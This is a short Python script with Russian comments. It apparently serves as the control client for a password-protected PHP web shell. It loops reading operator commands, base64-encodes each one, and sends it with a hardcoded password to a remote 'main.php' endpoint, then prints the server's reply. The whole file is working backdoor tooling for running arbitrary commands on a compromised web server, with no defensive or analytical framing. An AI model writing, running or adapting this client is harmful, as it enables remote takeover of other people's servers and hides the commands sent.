import requests
import base64

PASSWORD = "HG44g90P" # пароль, который проверяется скриптом main.php

first_path = "http://path-to-main.php" 

while True:
    cmd = input("Введите команду (или 'exit' для выхода): ")
    if cmd == "exit":
        break
    # Кодирование команды в base64
    encoded_cmd = base64.b64encode(cmd.encode()).decode()
    response = requests.get(first_path, params={"cmd": encoded_cmd, "password": PASSWORD})
    print(response.text)
